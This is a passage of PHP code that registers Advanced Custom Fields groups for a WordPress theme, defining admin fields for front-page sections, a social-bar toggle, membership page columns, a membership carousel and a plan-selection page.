                'default_value' => '',
                'toolbar' => 'full',
                'media_upload' => 'yes',
            ),
            array (
                'key' => 'field_5a1d8fb3a5f50',
                'label' => 'Top image background',
                'name' => 'top_image_background_s4',
                'type' => 'image',
                'save_format' => 'url',
                'preview_size' => 'thumbnail',
                'library' => 'all',
            ),
            array (
                'key' => 'field_5a1d9016c7c9c',
                'label' => 'Bag image',
                'name' => 'bag_image',
                'type' => 'image',
                'save_format' => 'url',
                'preview_size' => 'thumbnail',
                'library' => 'all',
            ),
            array (
                'key' => 'field_5a1d8fb3a5f4f',
                'label' => 'Image for mobile',
                'name' => 'image_for_mobile_s4',
                'type' => 'image',
                'save_format' => 'object',
                'preview_size' => 'thumbnail',
                'library' => 'all',
            ),
            array (
                'key' => 'field_5a1d8fb3a5f4e',
                'label' => 'Link button',
                'name' => 'link_button_s4',
                'type' => 'page_link',
                'post_type' => array (
                    0 => 'page',
                ),
                'allow_null' => 1,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_5a1d8fb2a5f4d',
                'label' => 'Button text',
                'name' => 'button_text_s4',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_5a1d8fb2a5f4c',
                'label' => 'Background',
                'name' => '',
                'type' => 'message',
                'message' => '<p style="margin-bottom: -15px;font-size: 126%;color: #fff;background: #0073aa;padding: 10px;"><strong>Background</strong></p>',
            ),
            array (
                'key' => 'field_5a1d8fb2a5f4b',
                'label' => 'Background Color',
                'name' => 'background_color_s4',
                'type' => 'color_picker',
                'default_value' => '',
            ),
            array (
                'key' => 'field_5a1d8fb2a5f4a',
                'label' => 'Background Image',
                'name' => 'background_image_s4',
                'type' => 'image',
                'save_format' => 'url',
                'preview_size' => 'thumbnail',
                'library' => 'all',
            ),
            array (
                'key' => 'field_5a1d8fb1a5f49',
                'label' => 'Background Attachment',
                'name' => 'background_attachment_s4',
                'type' => 'select',
                'choices' => array (
                    'scroll' => 'Scroll',
                    'fixed' => 'Fixed',
                    'inherit' => 'Inherit',
                ),
                'default_value' => '',
                'allow_null' => 1,
                'multiple' => 0,
            ),/*
            array (
                'key' => 'field_5a1d8fb1a5f48',
                'label' => 'Background Position',
                'name' => 'background_position_s4',
                'type' => 'select',
                'choices' => array (
                    'left top' => 'Left Top',
                    'left center' => 'Left Center',
                    'left bottom' => 'Left Bottom',
                    'right top' => 'Right Top',
                    'right center' => 'Right Center',
                    'right bottom' => 'Right Bottom',
                    'center top' => 'Center Top',
                    'center center' => 'Center Center',
                    'center bottom' => 'Center Bottom',
                ),
                'default_value' => '',
                'allow_null' => 1,
                'multiple' => 0,
            ),*/
            array (
                'key' => 'field_5a1d8fb1a5f47',
                'label' => 'Background Repeat',
                'name' => 'background_repeat_s4',
                'type' => 'select',
                'choices' => array (
                    'no-repeat' => 'No Repeat',
                    'repeat-x' => 'Horizontal Repeat',
                    'repeat-y' => 'Vertically Repeat',
                    'repeat' => 'Repeat both horizontal & vertical',
                ),
                'default_value' => '',
                'allow_null' => 1,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_5a1d8fb1a5f46',
                'label' => 'Background Size',
                'name' => 'background_size_s4',
                'type' => 'select',
                'choices' => array (
                    'auto' => 'Auto',
                    'initial' => 'Initial',
                    'contain' => 'Contain',
                    'cover' => 'Cover',
                ),
                'default_value' => '',
                'allow_null' => 1,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_5a1d8fea9a2dc',
                'label' => 'Session 5',
                'name' => '_green',
                'type' => 'tab',
            ),
            array (
                'key' => 'field_5a1d8fea9a2db',
                'label' => 'Title',
                'name' => 'title_s5_green',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_5a1d8fe99a2da',
                'label' => 'Subtitle',
                'name' => 'subtitle_s5_green',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_5a1d8fe99a2d9',
                'label' => 'First column',
                'name' => '_green',
                'type' => 'message',
                'message' => '<p style="margin-bottom: -15px;font-size: 126%;color: #fff;background: #0073aa;padding: 10px;"><strong>First column</strong></p>',
            ),
            array (
                'key' => 'field_5a1d8fe99a2d8',
                'label' => 'Image',
                'name' => 'image_c1_s5_green',
                'type' => 'image',
                'save_format' => 'object',
                'preview_size' => 'thumbnail',
                'library' => 'all',
            ),
            array (
                'key' => 'field_5a1d8fe99a2d7',
                'label' => 'Title',
                'name' => 'title_c1_s5_green',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_5a1d8fe89a2d6',
                'label' => 'Content Text',
                'name' => 'content_text_c1_s5_green',
                'type' => 'textarea',
                'default_value' => '',
                'placeholder' => '',
                'maxlength' => '',
                'rows' => '',
                'formatting' => 'br',
            ),
            array (
                'key' => 'field_5a1d8fe89a2d5',
                'label' => 'Second column',
                'name' => '_green',
                'type' => 'message',
                'message' => '<p style="margin-bottom: -15px;font-size: 126%;color: #fff;background: #0073aa;padding: 10px;"><strong>Second column</strong></p>',
            ),
            array (
                'key' => 'field_5a1d8fe89a2d4',
                'label' => 'Image',
                'name' => 'image_c2_s5_green',
                'type' => 'image',
                'save_format' => 'object',
                'preview_size' => 'thumbnail',
                'library' => 'all',
            ),
            array (
                'key' => 'field_5a1d8fe89a2d3',
                'label' => 'Title',
                'name' => 'title_c2_s5_green',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_5a1d8fe89a2d2',
                'label' => 'Content Text',
                'name' => 'content_text_c2_s5_green',
                'type' => 'textarea',
                'default_value' => '',
                'placeholder' => '',
                'maxlength' => '',
                'rows' => '',
                'formatting' => 'br',
            ),
            array (
                'key' => 'field_5a1d8fe79a2d1',
                'label' => 'Third column',
                'name' => '_green',
                'type' => 'message',
                'message' => '<p style="margin-bottom: -15px;font-size: 126%;color: #fff;background: #0073aa;padding: 10px;"><strong>Third column</strong></p>',
            ),
            array (
                'key' => 'field_5a1d8fe79a2d0',
                'label' => 'Image',
                'name' => 'image_c3_s5_green',
                'type' => 'image',
                'save_format' => 'object',
                'preview_size' => 'thumbnail',
                'library' => 'all',
            ),
            array (
                'key' => 'field_5a1d8fe79a2cf',
                'label' => 'Title',
                'name' => 'title_c3_s5_green',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_5a1d8fe79a2ce',
                'label' => 'Content Text',
                'name' => 'content_text_c3_s5_green',
                'type' => 'textarea',
                'default_value' => '',
                'placeholder' => '',
                'maxlength' => '',
                'rows' => '',
                'formatting' => 'br',
            ),
            array (
                'key' => 'field_5a1d8fe79a2cd',
                'label' => 'Button',
                'name' => '_green',
                'type' => 'message',
                'message' => '<p style="margin-bottom: -15px;font-size: 126%;color: #fff;background: #0073aa;padding: 10px;"><strong>Button</strong></p>',
            ),
            array (
                'key' => 'field_5a1d8fe79a2cc',
                'label' => 'Link button',
                'name' => 'link_button_s5_green',
                'type' => 'page_link',
                'post_type' => array (
                    0 => 'page',
                ),
                'allow_null' => 1,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_5a1d8fe69a2cb',
                'label' => 'Button text',
                'name' => 'button_text_s5_green',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_5a1d8fe69a2ca',
                'label' => 'Background',
                'name' => '_green',
                'type' => 'message',
                'message' => '<p style="margin-bottom: -15px;font-size: 126%;color: #fff;background: #0073aa;padding: 10px;"><strong>Background</strong></p>',
            ),
            array (
                'key' => 'field_5a1d8fe69a2c9',
                'label' => 'Background Color',
                'name' => 'background_color_s5_green',
                'type' => 'color_picker',
                'default_value' => '',
            ),
            array (
                'key' => 'field_5a1d8fe69a2c8',
                'label' => 'Background Image',
                'name' => 'background_image_s5_green',
                'type' => 'image',
                'save_format' => 'url',
                'preview_size' => 'thumbnail',
                'library' => 'all',
            ),
            array (
                'key' => 'field_5a1d8fe59a2c7',
                'label' => 'Background Attachment',
                'name' => 'background_attachment_s5_green',
                'type' => 'select',
                'choices' => array (
                    'scroll' => 'Scroll',
                    'fixed' => 'Fixed',
                    'inherit' => 'Inherit',
                ),
                'default_value' => '',
                'allow_null' => 1,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_5a1d8fe59a2c6',
                'label' => 'Background Position',
                'name' => 'background_position_s5_green',
                'type' => 'select',
                'choices' => array (
                    'left top' => 'Left Top',
                    'left center' => 'Left Center',
                    'left bottom' => 'Left Bottom',
                    'right top' => 'Right Top',
                    'right center' => 'Right Center',
                    'right bottom' => 'Right Bottom',
                    'center top' => 'Center Top',
                    'center center' => 'Center Center',
                    'center bottom' => 'Center Bottom',
                ),
                'default_value' => '',
                'allow_null' => 1,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_5a1d8fe59a2c5',
                'label' => 'Background Repeat',
                'name' => 'background_repeat_s5_green',
                'type' => 'select',
                'choices' => array (
                    'no-repeat' => 'No Repeat',
                    'repeat-x' => 'Horizontal Repeat',
                    'repeat-y' => 'Vertically Repeat',
                    'repeat' => 'Repeat both horizontal & vertical',
                ),
                'default_value' => '',
                'allow_null' => 1,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_5a1d8fe59a2c4',
                'label' => 'Background Size',
                'name' => 'background_size_s5_green',
                'type' => 'select',
                'choices' => array (
                    'auto' => 'Auto',
                    'initial' => 'Initial',
                    'contain' => 'Contain',
                    'cover' => 'Cover',
                ),
                'default_value' => '',
                'allow_null' => 1,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_5a1d9015c7c94',
                'label' => 'Session 6',
                'name' => '',
                'type' => 'tab',
            ),
            array (
                'key' => 'field_5a1d9015c7c93',
                'label' => 'Title',
                'name' => 'title_s6_green',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_5a1d9015c7c92',
                'label' => 'Subtitle',
                'name' => 'subtitle_s6_green',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_5a1d8feb9a2e3',
                'label' => 'Background',
                'name' => '',
                'type' => 'message',
                'message' => '<p style="margin-bottom: -15px;font-size: 126%;color: #fff;background: #0073aa;padding: 10px;"><strong>Background</strong></p>',
            ),
            array (
                'key' => 'field_5a1d8feb9a2e2',
                'label' => 'Background Color',
                'name' => 'background_color_s6_green',
                'type' => 'color_picker',
                'default_value' => '',
            ),
            array (
                'key' => 'field_5a1d8feb9a2e1',
                'label' => 'Background Image',
                'name' => 'background_image_s6_green',
                'type' => 'image',
                'save_format' => 'url',
                'preview_size' => 'thumbnail',
                'library' => 'all',
            ),
            array (
                'key' => 'field_5a1d8feb9a2e0',
                'label' => 'Background Attachment',
                'name' => 'background_attachment_s6_green',
                'type' => 'select',
                'choices' => array (
                    'scroll' => 'Scroll',
                    'fixed' => 'Fixed',
                    'inherit' => 'Inherit',
                ),
                'default_value' => '',
                'allow_null' => 1,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_5a1d8fea9a2df',
                'label' => 'Background Position',
                'name' => 'background_position_s6_green',
                'type' => 'select',
                'choices' => array (
                    'left top' => 'Left Top',
                    'left center' => 'Left Center',
                    'left bottom' => 'Left Bottom',
                    'right top' => 'Right Top',
                    'right center' => 'Right Center',
                    'right bottom' => 'Right Bottom',
                    'center top' => 'Center Top',
                    'center center' => 'Center Center',
                    'center bottom' => 'Center Bottom',
                ),
                'default_value' => '',
                'allow_null' => 1,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_5a1d8fea9a2de',
                'label' => 'Background Repeat',
                'name' => 'background_repeat_s6_green',
                'type' => 'select',
                'choices' => array (
                    'no-repeat' => 'No Repeat',
                    'repeat-x' => 'Horizontal Repeat',
                    'repeat-y' => 'Vertically Repeat',
                    'repeat' => 'Repeat both horizontal & vertical',
                ),
                'default_value' => '',
                'allow_null' => 1,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_5a1d8fea9a2dd',
                'label' => 'Background Size',
                'name' => 'background_size_s6_green',
                'type' => 'select',
                'choices' => array (
                    'auto' => 'Auto',
                    'initial' => 'Initial',
                    'contain' => 'Contain',
                    'cover' => 'Cover',
                ),
                'default_value' => '',
                'allow_null' => 1,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_5a1d8fe59a2c3',
                'label' => 'Session 7',
                'name' => '',
                'type' => 'tab',
            ),
            array (
                'key' => 'field_5a1d8fe59a2c2',
                'label' => 'Title',
                'name' => 'title_s7_green',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_5a1d8fe49a2c1',
                'label' => 'Subtitle',
                'name' => 'subtitle_s7_green',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_5a1d8fe49a2c0',
                'label' => 'Background',
                'name' => '',
                'type' => 'message',
                'message' => '<p style="margin-bottom: -15px;font-size: 126%;color: #fff;background: #0073aa;padding: 10px;"><strong>Background</strong></p>',
            ),
            array (
                'key' => 'field_5a1d8fe49a2bf',
                'label' => 'Background Color',
                'name' => 'background_color_s7_green',
                'type' => 'color_picker',
                'default_value' => '',
            ),
            array (
                'key' => 'field_5a1d8fe49a2be',
                'label' => 'Background Image',
                'name' => 'background_image_s7_green',
                'type' => 'image',
                'save_format' => 'url',
                'preview_size' => 'thumbnail',
                'library' => 'all',
            ),
            array (
                'key' => 'field_5a1d8fe49a2bd',
                'label' => 'Background Attachment',
                'name' => 'background_attachment_s7_green',
                'type' => 'select',
                'choices' => array (
                    'scroll' => 'Scroll',
                    'fixed' => 'Fixed',
                    'inherit' => 'Inherit',
                ),
                'default_value' => '',
                'allow_null' => 1,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_5a1d8fe49a2bc',
                'label' => 'Background Position',
                'name' => 'background_position_s7_green',
                'type' => 'select',
                'choices' => array (
                    'left top' => 'Left Top',
                    'left center' => 'Left Center',
                    'left bottom' => 'Left Bottom',
                    'right top' => 'Right Top',
                    'right center' => 'Right Center',
                    'right bottom' => 'Right Bottom',
                    'center top' => 'Center Top',
                    'center center' => 'Center Center',
                    'center bottom' => 'Center Bottom',
                ),
                'default_value' => '',
                'allow_null' => 1,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_5a1d8fe39a2bb',
                'label' => 'Background Repeat',
                'name' => 'background_repeat_s7_green',
                'type' => 'select',
                'choices' => array (
                    'no-repeat' => 'No Repeat',
                    'repeat-x' => 'Horizontal Repeat',
                    'repeat-y' => 'Vertically Repeat',
                    'repeat' => 'Repeat both horizontal & vertical',
                ),
                'default_value' => '',
                'allow_null' => 1,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_5a1d8fe39a2ba',
                'label' => 'Background Size',
                'name' => 'background_size_s7_green',
                'type' => 'select',
                'choices' => array (
                    'auto' => 'Auto',
                    'initial' => 'Initial',
                    'contain' => 'Contain',
                    'cover' => 'Cover',
                ),
                'default_value' => '',
                'allow_null' => 1,
                'multiple' => 0,
            ),
        ),
        'location' => array (
            array (
                array (
                    'param' => 'page_template',
                    'operator' => '==',
                    'value' => 'front-page-green.php',
                    'order_no' => 0,
                    'group_no' => 0,
                ),
            ),
        ),
        'options' => array (
            'position' => 'normal',
            'layout' => 'no_box',
            'hide_on_screen' => array (
                0 => 'the_content',
            ),
        ),
        'menu_order' => -1,
    ));
}
if(function_exists("register_field_group"))
{
    register_field_group(array (
        'id' => 'acf_show-social-bar',
        'title' => 'Show social bar',
        'fields' => array (
            array (
                'key' => 'field_59eb6de159e00',
                'label' => 'Show social bar',
                'name' => 'show_social_bar',
                'type' => 'radio',
                'choices' => array (
                    'yes' => 'Yes',
                    'not' => 'Not',
                ),
                'other_choice' => 0,
                'save_other_choice' => 0,
                'default_value' => '',
                'layout' => 'horizontal',
            ),
        ),
        'location' => array (
            array (
                array (
                    'param' => 'post_type',
                    'operator' => '==',
                    'value' => 'post',
                    'order_no' => 0,
                    'group_no' => 0,
                ),
            ),
            array (
                array (
                    'param' => 'post_type',
                    'operator' => '==',
                    'value' => 'page',
                    'order_no' => 0,
                    'group_no' => 1,
                ),
            ),
        ),
        'options' => array (
            'position' => 'side',
            'layout' => 'default',
            'hide_on_screen' => array (
            ),
        ),
        'menu_order' => -1,
    ));
}
if(function_exists("register_field_group"))
{
    register_field_group(array (
        'id' => 'acf_show-the-top-header',
        'title' => 'Show the top header',
        'fields' => array (
            array (
                'key' => 'field_5a172aef777f3',
                'label' => 'Show the top header',
                'name' => 'show_the_top_header',
                'type' => 'radio',
                'choices' => array (
                    'yes' => 'Yes',
                    'not' => 'Not',
                ),
                'other_choice' => 0,
                'save_other_choice' => 0,
                'default_value' => 'yes',
                'layout' => 'horizontal',
            ),
        ),
        'location' => array (
            array (
                array (
                    'param' => 'page_template',
                    'operator' => '==',
                    'value' => 'page-select-your-plan.php',
                    'order_no' => 0,
                    'group_no' => 0,
                ),
            ),
        ),
        'options' => array (
            'position' => 'side',
            'layout' => 'default',
            'hide_on_screen' => array (
            ),
        ),
        'menu_order' => -1,
    ));
}
if(function_exists("register_field_group"))
{
    register_field_group(array (
        'id' => 'acf_membership',
        'title' => 'Membership',
        'fields' => array (
            array (
                'key' => 'field_59fb8b0495b70',
                'label' => 'Page header',
                'name' => '',
                'type' => 'tab',
            ),
            array (
                'key' => 'field_59fa467dc9199',
                'label' => 'Title',
                'name' => 'title_ph',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'none',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_5a009f9cf6e64',
                'label' => 'Subtitle',
                'name' => 'subtitle_ph',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_59fa467dc9198',
                'label' => 'Content Text',
                'name' => 'content_text_ph',
                'type' => 'textarea',
                'default_value' => '',
                'placeholder' => '',
                'maxlength' => '',
                'rows' => '',
                'formatting' => 'br',
            ),
            array (
                'key' => 'field_59fb939e2e427',
                'label' => 'Background',
                'name' => '',
                'type' => 'message',
                'message' => '<p style="margin-bottom: -15px;font-size: 126%;color: #fff;background: #0073aa;padding: 10px;"><strong>Background</strong></p>',
            ),
            array (
                'key' => 'field_59fb939e2e426',
                'label' => 'Background Color',
                'name' => 'background_color_ph',
                'type' => 'color_picker',
                'default_value' => '',
            ),
            array (
                'key' => 'field_59fb939e2e425',
                'label' => 'Background Image',
                'name' => 'background_image_ph',
                'type' => 'image',
                'save_format' => 'url',
                'preview_size' => 'thumbnail',
                'library' => 'all',
            ),
            array (
                'key' => 'field_59fb939e2e424',
                'label' => 'Background Attachment',
                'name' => 'background_attachment_ph',
                'type' => 'select',
                'choices' => array (
                    'scroll' => 'Scroll',
                    'fixed' => 'Fixed',
                    'inherit' => 'Inherit',
                ),
                'default_value' => '',
                'allow_null' => 1,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_59fb939d2e423',
                'label' => 'Background Position',
                'name' => 'background_position_ph',
                'type' => 'select',
                'choices' => array (
                    'left top' => 'Left Top',
                    'left center' => 'Left Center',
                    'left bottom' => 'Left Bottom',
                    'right top' => 'Right Top',
                    'right center' => 'Right Center',
                    'right bottom' => 'Right Bottom',
                    'center top' => 'Center Top',
                    'center center' => 'Center Center',
                    'center bottom' => 'Center Bottom',
                ),
                'default_value' => '',
                'allow_null' => 1,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_59fb939d2e422',
                'label' => 'Background Repeat',
                'name' => 'background_repeat_ph',
                'type' => 'select',
                'choices' => array (
                    'no-repeat' => 'No Repeat',
                    'repeat-x' => 'Horizontal Repeat',
                    'repeat-y' => 'Vertically Repeat',
                    'repeat' => 'Repeat both horizontal & vertical',
                ),
                'default_value' => '',
                'allow_null' => 1,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_59fb939d2e421',
                'label' => 'Background Size',
                'name' => 'background_size_ph',
                'type' => 'select',
                'choices' => array (
                    'auto' => 'Auto',
                    'initial' => 'Initial',
                    'contain' => 'Contain',
                    'cover' => 'Cover',
                ),
                'default_value' => '',
                'allow_null' => 1,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_59fa469a9bd07',
                'label' => 'First column',
                'name' => '',
                'type' => 'tab',
            ),
            array (
                'key' => 'field_59fa469a9bd06',
                'label' => 'Title',
                'name' => 'title_s1',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_59fa469a9bd05',
                'label' => 'Subtitle',
                'name' => 'subtitle_s1',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),/*
            array (
                'key' => 'field_59fa469a9bd04',
                'label' => 'Value for time',
                'name' => 'value_for_time_s1',
                'type' => 'text',
                'instructions' => 'i.e. [tpc_price_big value="275"] / MONTHLY',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),*/
            array (
                'key' => 'field_59fa469a9bd03',
                'label' => 'Detail of the value',
                'name' => 'detail_of_the_value_s1',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_59fa46999bd02',
                'label' => 'Content text',
                'name' => 'content_text_s1',
                'type' => 'textarea',
                'default_value' => '',
                'placeholder' => '',
                'maxlength' => '',
                'rows' => '',
                'formatting' => 'br',
            ),
            array (
                'key' => 'field_5a1d8fe39a2b9',
                'label' => 'product category',
                'name' => 'membership_product_category_s1',
                'type' => 'taxonomy',
                'taxonomy' => 'product_cat',
                'field_type' => 'select',
                'allow_null' => 0,
                'load_save_terms' => 0,
                'return_format' => 'object',
                'multiple' => 0,
            ),
            array (
                'key' => 'field_59fb939c2e41d',
                'label' => 'Membership carousel category',
                'name' => 'membership_carousel_category_s1',
                'type' => 'taxonomy',
                'taxonomy' => 'category',
                'field_type' => 'select',
                'allow_null' => 0,
                'load_save_terms' => 0,
                'return_format' => 'object',
                'multiple' => 0,
            ),
            array (
                'key' => 'field_59fa46999bd01',
                'label' => 'See details',
                'name' => 'see_details_s1',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_59fb939d2e420',
                'label' => 'Popup detail',
                'name' => 'popup_detail_s1',
                'type' => 'textarea',
                'default_value' => '',
                'placeholder' => '',
                'maxlength' => '',
                'rows' => '',
                'formatting' => 'html',
            ),/*
            array (
                'key' => 'field_59fa46999bd00',
                'label' => 'Link button',
                'name' => 'link_button_s1',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),*/
            array (
                'key' => 'field_59fb93922e3fd',
                'label' => 'Button text',
                'name' => 'button_text_s1',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_59fb93a02e432',
                'label' => 'Second column',
                'name' => '',
                'type' => 'tab',
            ),
            array (
                'key' => 'field_59fb93a02e431',
                'label' => 'Title',
                'name' => 'title_s2',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_59fb93a02e430',
                'label' => 'Subtitle',
                'name' => 'subtitle_s2',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),/*
            array (
                'key' => 'field_59fb93a02e42f',
                'label' => 'Value for time',
                'name' => 'value_for_time_s2',
                'type' => 'text',
                'instructions' => 'i.e. [tpc_price_big value="275"] / MONTHLY',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),*/
            array (
                'key' => 'field_59fb939f2e42e',
                'label' => 'Detail of the value',
                'name' => 'detail_of_the_value_s2',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_59fb939f2e42c',
                'label' => 'Content text',
                'name' => 'content_text_s2',
                'type' => 'textarea',
                'default_value' => '',
                'placeholder' => '',
                'maxlength' => '',
                'rows' => '',
                'formatting' => 'br',
            ),
            array (
                'key' => 'field_5a21c64bc49ce',
                'label' => 'product category',
                'name' => 'product_category_s2',
                'type' => 'taxonomy',
                'taxonomy' => 'product_cat',
                'field_type' => 'select',
                'allow_null' => 0,
                'load_save_terms' => 0,
                'return_format' => 'object',
                'multiple' => 0,
            ),
            array (
                'key' => 'field_59fb939c2e41e',
                'label' => 'Membership carousel category',
                'name' => 'membership_carousel_category_s2',
                'type' => 'taxonomy',
                'taxonomy' => 'category',
                'field_type' => 'select',
                'allow_null' => 0,
                'load_save_terms' => 0,
                'return_format' => 'object',
                'multiple' => 0,
            ),
            array (
                'key' => 'field_59fb939f2e42b',
                'label' => 'See details',
                'name' => 'see_details_s2',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_59fb939d2e41f',
                'label' => 'Popup detail',
                'name' => 'popup_detail_s2',
                'type' => 'textarea',
                'default_value' => '',
                'placeholder' => '',
                'maxlength' => '',
                'rows' => '',
                'formatting' => 'html',
            ),/*
            array (
                'key' => 'field_59fb939f2e42a',
                'label' => 'Link button',
                'name' => 'link_button_s2',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),*/
            array (
                'key' => 'field_59fb939e2e428',
                'label' => 'Button text',
                'name' => 'button_text_s2',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
        ),
        'location' => array (
            array (
                array (
                    'param' => 'page_template',
                    'operator' => '==',
                    'value' => 'page-membership.php',
                    'order_no' => 0,
                    'group_no' => 0,
                ),
            ),
        ),
        'options' => array (
            'position' => 'normal',
            'layout' => 'no_box',
            'hide_on_screen' => array (
                0 => 'the_content',
            ),
        ),
        'menu_order' => -1,
    ));
}
if(function_exists("register_field_group"))
{
    register_field_group(array (
        'id' => 'acf_membership-carousel',
        'title' => 'Membership Carousel',
        'fields' => array (
            array (
                'key' => 'field_59fc7b298dabe',
                'label' => 'Image',
                'name' => 'image',
                'type' => 'image',
                'save_format' => 'object',
                'preview_size' => 'thumbnail',
                'library' => 'all',
            ),
        ),
        'location' => array (
            array (
                array (
                    'param' => 'post_type',
                    'operator' => '==',
                    'value' => 'membership_carousel',
                    'order_no' => 0,
                    'group_no' => 0,
                ),
            ),
        ),
        'options' => array (
            'position' => 'normal',
            'layout' => 'no_box',
            'hide_on_screen' => array (
                0 => 'permalink',
                1 => 'the_content',
                2 => 'featured_image',
            ),
        ),
        'menu_order' => 0,
    ));
}
if(function_exists("register_field_group"))
{
    register_field_group(array (
        'id' => 'acf_select-your-plan',
        'title' => 'Select Your Plan',
        'fields' => array (
            array (
                'key' => 'field_59fb939b2e414',
                'label' => 'Page header',
                'name' => '',
                'type' => 'tab',
            ),
            array (
                'key' => 'field_59fb939a2e413',
                'label' => 'Title',
                'name' => 'title_ph',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'none',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_5a009f9cf6e63',
                'label' => 'Subtitle',
                'name' => 'subtitle_ph',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_59fb939a2e412',
                'label' => 'Content Text',
                'name' => 'content_text_ph',
                'type' => 'textarea',
                'default_value' => '',
                'placeholder' => '',
                'maxlength' => '',
                'rows' => '',
                'formatting' => 'br',
            ),
            array (
                'key' => 'field_59fb939a2e411',
                'label' => 'Background',
                'name' => '',
                'type' => 'message',
                'message' => '<p style="margin-bottom: -15px;font-size: 126%;color: #fff;background: #0073aa;padding: 10px;"><strong>Background</strong></p>',
            ),
            array (
                'key' => 'field_59fb939a2e410',
                'label' => 'Background Color',
                'name' => 'background_color_ph',
                'type' => 'color_picker',
                'default_value' => '',
            ),
            array (
                'key' => 'field_59fb939a2e40f',
